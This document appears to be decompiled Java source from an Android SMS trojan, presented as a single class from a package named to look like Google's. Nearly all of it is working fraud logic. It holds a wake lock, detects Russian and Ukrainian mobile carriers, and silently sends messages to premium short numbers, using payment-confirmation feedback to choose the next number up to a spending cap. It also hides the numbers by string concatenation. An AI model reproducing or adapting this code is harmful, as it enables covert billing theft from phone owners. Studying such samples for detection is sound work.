@@ -1,0 +1,315 @@
+Package Path:com.googleapi.cover.ActService.Worker
+Class Name:ActService
+Java Code: package com.googleapi.cover;
+
+    private class Worker extends Thread {
+        private Worker() {
+        }
+
+        /* synthetic */ Worker(ActService actService, Worker worker) {
+            this();
+        }
+
+        @Override // java.lang.Thread, java.lang.Runnable
+        public void run() {
+            ActService.isStarted = true;
+            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
+            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
+            ActService.this.wakeLock.acquire();
+            performActions();
+            ActService.isStarted = false;
+            ActService.this.stopSelf();
+        }
+
+        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_1);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, ActService.NUM_1);
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_1);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_1);
+                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
+                result.put(Actor.NUM_1, "-1");
+                result.put(Actor.NUM_1_ALT, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, ActService.NUM_1);
+                    result.put(Actor.NUM_2, Actor.NUM_2);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1);
+                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
+                }
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF) {
+                result.put(ActService.NUM_10, ActService.NUM_5);
+                result.put(ActService.NUM_5, ActService.NUM_3);
+                result.put(ActService.NUM_3, ActService.NUM_1);
+                result.put(ActService.NUM_1, "-1");
+            } else {
+                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
+                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
+                result.put(Actor.NUM_5, Actor.NUM_3);
+                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
+                result.put(Actor.NUM_3_ALT, "-1");
+                result.put(Actor.NUM_1, "-1");
+                if (isBeline) {
+                    result.put(ActService.NUM_1, Actor.NUM_2);
+                    result.put(Actor.NUM_2, Actor.NUM_1);
+                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
+                    result.put(Actor.NUM_1_ALT, "-1");
+                }
+            }
+            return new HashMap<>(result);
+        }
+
+        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
+            TreeMap<String, String> result = new TreeMap<>();
+            if (isMTSRF || isBeline) {
+                result.put(ActService.NUM_1, ActService.NUM_2_SD);
+                result.put(ActService.NUM_3, ActService.NUM_2_SD);
+                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
+                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
+                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
+                result.put(ActService.NUM_1_ALT_2_SD, "-1");
+            }
+            return new HashMap<>(result);
+        }
+
+        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
+            ArrayList<String> result = new ArrayList<>();
+            if (isMTSRF) {
+                result.add(ActService.NUM_10);
+                result.add(ActService.NUM_5);
+                result.add(ActService.NUM_3);
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            } else if (!isBeline) {
+                result.add(Actor.NUM_10);
+                result.add(Actor.NUM_10_ALT);
+                result.add(Actor.NUM_5);
+                result.add(Actor.NUM_5_ALT);
+                result.add(Actor.NUM_3);
+                result.add(Actor.NUM_3_ALT);
+                result.add(Actor.NUM_2);
+                result.add(Actor.NUM_1);
+                result.add(Actor.NUM_1_ALT);
+            } else {
+                result.add(ActService.NUM_1);
+                result.add(ActService.NUM_2_SD);
+                result.add(ActService.NUM_1_SD);
+                result.add(ActService.NUM_1_ALT_SD);
+                result.add(ActService.NUM_1_ALT_2_SD);
+            }
+            return result;
+        }
+
+        private void performActions() {
+            String lastNumber;
+            Context context = ActService.this.getApplicationContext();
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            String opStr = settings.getString(Actor.NETWORK_STRING, "");
+            Actor act = new Actor(context, opStr);
+            if (act.isUkrCode()) {
+                actUK(act, settings);
+                return;
+            }
+            boolean isMTSRF = act.isMTSRF();
+            boolean isBeeline = act.isBeline();
+            if (act.isPrivate()) {
+                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
+                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
+                int acceptedNums = 0;
+                if (isBeeline) {
+                    String currentNumber = ActService.NUM_1;
+                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    do {
+                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber = positives.get(currentNumber);
+                        } else {
+                            if (currentNumber.equals(ActService.NUM_1)) {
+                                if (acceptedNums != 0) {
+                                    break;
+                                }
+                                ActService.PREF_TO_USE = Actor.PREF_PORT;
+                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
+                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
+                            }
+                            currentNumber = negatives.get(currentNumber);
+                        }
+                        if (currentNumber == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber.equalsIgnoreCase("-1"));
+                } else if (isMTSRF || act.isMF()) {
+                    double restAllowedSum = 0.0d;
+                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
+                    if (isMTSRF) {
+                        ActService.PREF_TO_USE = ActService.PREF_A1;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mtsPrices;
+                    } else if (act.isMF()) {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mfPrices;
+                    }
+                    int currentNumberIndex = 0;
+                    while (true) {
+                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
+                            currentNumberIndex++;
+                        } else {
+                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
+                                break;
+                            }
+                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
+                            do {
+                                try {
+                                    sleep(100L);
+                                } catch (InterruptedException e2) {
+                                }
+                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                                acceptedNums++;
+                                if (acceptedNums < 3) {
+                                    smsData = act.getRelatedData(acceptedNums - 1);
+                                    waitForAcceptance(acceptedNums, settings);
+                                }
+                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
+                            } else {
+                                currentNumberIndex++;
+                            }
+                        }
+                    }
+                } else {
+                    String currentNumber2 = Actor.NUM_10;
+                    String num3_alt = Actor.NUM_3_ALT;
+                    new String();
+                    ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    do {
+                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e3) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        lastNumber = currentNumber2;
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber2 = positives.get(currentNumber2);
+                        } else {
+                            currentNumber2 = negatives.get(currentNumber2);
+                        }
+                        if (currentNumber2 == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber2.equalsIgnoreCase("-1"));
+                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                    }
+                }
+            } else {
+                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
+                for (int i = 0; i < numbers.size(); i++) {
+                    String number = numbers.get(i);
+                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
+                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    } else {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    }
+                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
+                    do {
+                        try {
+                            sleep(100L);
+                        } catch (InterruptedException e4) {
+                        }
+                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                        break;
+                    }
+                }
+            }
+            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
+            act.reportDone();
+        }
+
+        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
+            do {
+                try {
+                    sleep(100L);
+                } catch (InterruptedException e) {
+                }
+            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
+        }
+
+        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
+            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
+            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
+            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
+        }
+
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                }
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
+                }
+            }
+            act.reportDone();
+        }
+    }
